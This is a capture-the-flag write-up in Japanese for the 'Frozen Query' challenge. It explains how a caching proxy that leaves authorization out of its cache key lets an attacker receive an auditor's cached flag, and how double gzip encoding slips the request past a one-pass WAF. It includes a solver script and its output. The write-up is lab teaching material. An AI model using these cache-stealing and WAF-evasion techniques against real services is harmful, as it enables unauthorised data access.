# Frozen Query — Writeup

## flag

```
gctf{QU3RY_c4ch3_k3y5_mu5t_c0v3r_th3_wh0l3_r3qu35t}
```

## 構成を把握する

- `app.py`：外向きのキャッシュ付きリバースプロキシ（glacier-edge）。HTTP の `QUERY` メソッド（RFC 10008）を受け付ける
- `backend.py`：中のAPI。`region` が `summit`、または `fields` に `flag` が入っていると **auditor 以外は 403**

普通に `{"region":"summit","fields":["flag"]}` を投げても弾かれる。
タグに `cache` があるので、「auditor が取得したレスポンスがキャッシュに乗って、それを横取りする」系だろうと当たりをつけて読み進めた。

## 気になったところ① auditor が定期的に flag を取りに来ている

```python
def auditor_loop():
    while True:
        query = {
            "region": "summit",
            "fields": ["level", "note", "flag"],
            "window": int(time.time() // 30),
        }
        requests.request("QUERY", "http://127.0.0.1:1337/api/bulletin",
            data=json.dumps(query),
            headers={
                "Authorization": f"Bearer {AUDIT_TOKEN}",
                "Content-Type": "application/vnd.glacier.bulletin+json",
                "Accept": "application/json",
                "Cache-Control": "no-cache",
            })
        time.sleep(5)
```

`Cache-Control: no-cache` は「キャッシュを **読まない**」だけで、書き込みはされる。
backend は `Cache-Control: public, max-age=30` を返すので、

```python
shareable = not request.headers.get("Authorization") or "public" in cc
```

で `public` が付いている → **auditor のレスポンス（flag入り）が30秒キャッシュされる**。

## 気になったところ② キャッシュキーが自分のリクエストと一致させられる

```python
material = "\n".join([path, media_type, accept, canonical])
```

キーに使われるのは path / media type / Accept / 正規化した JSON だけで、**Authorization は含まれていない**。

- `media_type`：`application/vnd.glacier.bulletin+json` は `+json` なので `application/json` に正規化される → 自分は `application/json` を送ればいい
- `accept`：`application/json` で揃える
- `canonical`：`sort_keys=True` で正規化されるので、キー順は気にしなくていい。`window` は `time // 30` なので自分で計算できる

つまり auditor と同じクエリを投げれば、auditor のキャッシュエントリに HIT して flag が返ってくるはず。

## 問題点：WAF

ただし auditor でないリクエストは WAF を通る。

```python
BLOCKLIST = ("flag", "summit")

def waf_allows(body, encoding):
    codings = parse_codings(encoding)
    if codings and codings[-1] == "gzip":
        body = gunzip(body)   # ← 1回だけ
    ...
```

一方キャッシュキーを作る側は

```python
def decode_content(body, encoding):
    for _ in reversed(parse_codings(encoding)):
        body = gunzip(body)   # ← coding の数だけ
```

WAF は gzip を **1回しか** 剥がさないのに、キー生成側は `Content-Encoding` に書いた回数だけ剥がす。
→ **`Content-Encoding: gzip, gzip` で二重 gzip にすれば、WAF からは中身が見えない**。
1回剥がしてもまだ gzip のバイナリなので `flag` も `summit` も文字列として出てこない。

## 解法まとめ

1. 自分のクエリ `{"region":"summit","fields":["level","note","flag"],"window": now}` を作る
2. 二重 gzip して `Content-Encoding: gzip, gzip` を付ける（WAF回避）
3. `Content-Type: application/json`, `Accept: application/json` で auditor とキャッシュキーを揃える
4. auditor が5秒ごとにキャッシュを更新してくれるので、`X-Cache: HIT` が返るまで投げ続ける
   （時計ずれ対策で `window` は `now-1, now, now+1` を試す）

```python
def send(window):
    q = {"region": "summit", "fields": ["level", "note", "flag"], "window": window}
    body = gzip.compress(gzip.compress(json.dumps(q).encode()))
    return requests.request("QUERY", URL, data=body, headers={
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Content-Encoding": "gzip, gzip",
    })
```

（全体は [`solver.py`](./solver.py)）

## 実行結果

```
$ python3 solver.py
59840006 200 HIT {"flag":"gctf{QU3RY_c4ch3_k3y5_mu5t_c0v3r_th3_wh0l3_r3qu35t}","level":5,"note":"Extreme. Station closed to the public.","region":"summit","window":59840006}
```

## 振り返り

- flag の通り「キャッシュキーはリクエスト全体（特に認証情報）をカバーすべき」
- 「チェックする側」と「実際に使う側」でデコード回数が違うと WAF は簡単にすり抜けられる
- `no-cache` は読まないだけで、書き込みは普通に起こる
